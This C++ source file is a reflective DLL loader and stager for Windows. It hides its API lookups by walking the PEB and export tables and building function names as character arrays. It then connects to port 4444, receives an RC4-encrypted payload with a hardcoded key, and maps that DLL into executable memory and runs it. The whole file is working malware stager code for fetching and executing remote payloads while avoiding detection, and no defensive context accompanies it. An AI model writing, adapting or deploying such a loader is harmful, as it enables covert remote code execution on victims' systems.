// rdi_rc4.cpp

#include <windows.h>
#include <winternl.h>

// Protocol
typedef HMODULE (WINAPI* fnLoadLibraryA)(LPCSTR);
typedef LPVOID (WINAPI* fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL (WINAPI* fnDllMain)(HINSTANCE, DWORD, LPVOID);
typedef ULONG_PTR (WINAPI* fnGPA)(ULONG_PTR, const char*);
typedef int (WINAPI* fnWSAStartup)(WORD, LPVOID);
typedef ULONG_PTR(WINAPI* fnWSASocketA)(int, int, int, LPVOID, int, DWORD);
typedef int (WINAPI* fnConnect)(ULONG_PTR, const sockaddr*, int);
typedef int (WINAPI* fnRecv)(ULONG_PTR, char*, int, int);

// RC4

static const unsigned char RC4_KEY[] = {
    'M','y','S','e','c','r','e','t','K','e','y','1','2','3'
};

#define RC4_KEYLEN sizeof(RC4_KEY)/sizeof(RC4_KEY[0])

static void rc4_init(unsigned char* S, const unsigned char* key, int nkey_len)
{
    for (int i = 0; i < 256; i++)
        S[i] = (unsigned char)i;

    int j = 0;
    for (int i = 0; i < 256; i++)
    {
        j = (j + S[i] + key[i % nkey_len]) % 256;
        unsigned char t = S[i];
        S[i] = S[j];
        S[j] = t;
    }
}

static void rc4_crypt(unsigned char* S, int* pi, int* pj, unsigned char* data, int len)
{
    int i = *pi;
    int j = *pj;

    for (int n = 0; n < len; n++)
    {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;

        // swap
        unsigned char t = S[i];
        S[i] = S[j];
        S[j] = t;

        data[n] ^= S[(S[i] + S[j]) % 256];
    }

    *pi = i;
    *pj = j;
}

static ULONG_PTR _k32()
{
    ULONG_PTR r;
    __asm__ volatile (
        "movl %%fs:0x30, %%eax\n\t"
        "movl 0x0C(%%eax), %%eax\n\t"
        "movl 0x14(%%eax), %%eax\n\t"
        "movl (%%eax), %%eax\n\t"
        "movl (%%eax), %%eax\n\t"
        "movl 0x10(%%eax), %0\n\t"
        : "=r"(r) : : "eax"
    );

    return r;
}

static ULONG_PTR _gpa(ULONG_PTR base, const char* name)
{
    if (!base)
        return 0;

    auto dos = (PIMAGE_DOS_HEADER)base;
    auto nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    DWORD erva = nt->OptionalHeader.DataDirectory[0].VirtualAddress;
    if (!erva)
        return 0;

    auto ed = (PIMAGE_EXPORT_DIRECTORY)(base + erva);
    auto names = (DWORD *)(base + ed->AddressOfNames);
    auto ords = (WORD *)(base + ed->AddressOfNameOrdinals);
    auto funcs = (DWORD *)(base + ed->AddressOfFunctions);
    if ((ULONG_PTR)name < 0x10000)
        return base + funcs[(DWORD)(ULONG_PTR)name - ed->Base];

    for (DWORD i = 0; i < ed->NumberOfNames; i++)
    {
        const char* a = name;
        const char* b = (char *)(base + names[i]);

        while (*a && *a == *b)
        {
            a++;
            b++;
        }

        if (!*a && !*b)
            return base + funcs[ords[i]];
    }

    return 0;
}

static void _load(char* dll, fnLoadLibraryA pLLA, fnVirtualAlloc pVA, fnGPA pGPA)
{
    auto dos = (PIMAGE_DOS_HEADER)dll;
    auto nt = (PIMAGE_NT_HEADERS)(dll + dos->e_lfanew);
    char *img = (char *)pVA((LPVOID)nt->OptionalHeader.ImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!img)
        img = (char *)pVA(NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!img)
        return;

    // headers
    for (DWORD i = 0; i < nt->OptionalHeader.SizeOfHeaders; i++)
        img[i] = dll[i];

    // sections
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
    {
        if (sec[i].SizeOfRawData)
        {
            for (DWORD j = 0; j < sec[i].SizeOfRawData; j++)
            {
                img[sec[i].VirtualAddress + j] = dll[sec[i].PointerToRawData + j];
            }
        }
    }

    // relocations
    LONG_PTR delta = (LONG_PTR)(img - (char *)nt->OptionalHeader.ImageBase);
    DWORD rRVA = nt->OptionalHeader.DataDirectory[5].VirtualAddress;
    if (delta && rRVA)
    {
        auto r = (PIMAGE_BASE_RELOCATION)(img + rRVA);
        while (r->SizeOfBlock > 8)
        {
            DWORD count = (r->SizeOfBlock - 8) / 2;
            WORD* e = (WORD*)((char *)r + 8);
            for (DWORD i = 0; i < count; i++)
            {
                if ((e[i] >> 12) == 3)
                {
                    *(DWORD *)(img + r->VirtualAddress + (e[i] & 0xFFF)) += (DWORD)delta;
                }
            }

            r = (PIMAGE_BASE_RELOCATION)((char *)r + r->SizeOfBlock);
        }
    }

    // imports
    DWORD iRVA = nt->OptionalHeader.DataDirectory[1].VirtualAddress;
    if (iRVA)
    {
        auto id = (PIMAGE_IMPORT_DESCRIPTOR)(img + iRVA);
        while (id->Name)
        {
            HMODULE hm = pLLA((LPCTSTR)(img + id->Name));
            auto ti = (PIMAGE_THUNK_DATA)(img + (id->OriginalFirstThunk ? id->OriginalFirstThunk : id->FirstThunk));
            auto ta = (PIMAGE_THUNK_DATA)(img + id->FirstThunk);
            
            while (ti->u1.AddressOfData)
            {
                if (IMAGE_SNAP_BY_ORDINAL(ti->u1.Ordinal))
                {
                    ta->u1.Function = pGPA((ULONG_PTR)hm, (LPCSTR)IMAGE_ORDINAL(ti->u1.Ordinal));
                }
                else
                {
                    auto ibn = (PIMAGE_IMPORT_BY_NAME)(img + ti->u1.AddressOfData);
                    ta->u1.Function = pGPA((ULONG_PTR)hm, (LPCSTR)ibn->Name);
                }

                ti++;
                ta++;
            }

            id++;
        }
    }

    // DllMain
    if (nt->OptionalHeader.AddressOfEntryPoint)
    {
        auto ep = (fnDllMain)(img + nt->OptionalHeader.AddressOfEntryPoint);
        ep((HINSTANCE)img, 1, NULL);
    }

    // call payload_run
    char fn[] = {'p','a','y','l','o','a','d','_','r','u','n',0};
    ULONG_PTR pfn = pGPA((ULONG_PTR)img, fn);
    if (pfn)
        ((void(*)())pfn)();
}

// entry point
extern "C" void __attribute__((section(".text"))) rdi_entry(void)
{
    ULONG_PTR k32 = _k32();
    char sLLA[] = {'L','o','a','d','L','i','b','r','a','r','y','A',0};
    char sVA[]  = {'V','i','r','t','u','a','l','A','l','l','o','c',0};
    char sWs2[] = {'w','s','2','_','3','2','.','d','l','l',0};
    char sWSAS[] = {'W','S','A','S','t','a','r','t','u','p',0};
    char sWSASock[] = {'W','S','A','S','o','c','k','e','t','A',0};
    char sCon[]  = {'c','o','n','n','e','c','t',0};
    char sRecv[] = {'r','e','c','v',0};
 
    auto pLLA = (fnLoadLibraryA)_gpa(k32, sLLA);
    auto pVA = (fnVirtualAlloc)_gpa(k32, sVA);
    auto pGPA = (fnGPA)_gpa(k32, "GetProcAddress");
    if (!pLLA || !pVA || !pGPA)
        return;

    HMODULE hWs2 = pLLA(sWs2);
    if (!hWs2)
        return;

    auto pWSAS = (fnWSAStartup)_gpa((ULONG_PTR)hWs2, sWSAS);
    auto pWSASock = (fnWSASocketA)_gpa((ULONG_PTR)hWs2, sWSASock);
    auto pConnect = (fnConnect)_gpa((ULONG_PTR)hWs2, sCon);
    auto pRecv = (fnRecv)_gpa((ULONG_PTR)hWs2, sRecv);

    if (!pWSAS || !pWSASock || !pConnect || !pRecv)
        return;

    char wsaBuf[400];
    if (pWSAS(0x0202, wsaBuf) != 0)
        return;

    ULONG_PTR sock = pWSASock(2, 1, 6, NULL, 0, 0);
    if ((ULONG_PTR)INVALID_HANDLE_VALUE == sock)
        return;

    // ip:4444
    sockaddr_in addr;
    addr.sin_family = 2;
    addr.sin_port = 4444;
    addr.sin_addr.s_addr = 0x7F000001; // 127.0.0.1
    if (pConnect(sock, (sockaddr *)&addr, sizeof(addr)) != 0)
        return;

    unsigned char S[256];
    int rc4_i = 0, rc4_j = 0;
    rc4_init(S, RC4_KEY, RC4_KEYLEN);

    unsigned char enc_size[4] = { 0 };
    int got = 0;
    while (got < 4)
    {
        int r = pRecv(sock, (char *)enc_size + got, 4 - got, 0);
        if (r <= 0)
            return;

        got += r;
    }

    rc4_crypt(S, &rc4_i, &rc4_j, enc_size, 4);
    unsigned int payload_size = *(unsigned int *)enc_size;
    if (payload_size == 0 || payload_size > 64 * 1024 * 1024)
        return;

    // allocate buffer
    char *rawBuf = (char *)pVA(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!rawBuf)
        return;

    // recv loop
    unsigned int total = 0;
    while (total < payload_size)
    {
        int chunk = pRecv(sock, rawBuf + total, (int)(payload_size - total), 0);
        if (chunk <= 0)
            return;

        rc4_crypt(S, &rc4_i, &rc4_j, (unsigned char *)rawBuf + total, chunk);
        total += (unsigned int)chunk;
    }

    _load(rawBuf, pLLA, pVA, pGPA);
}
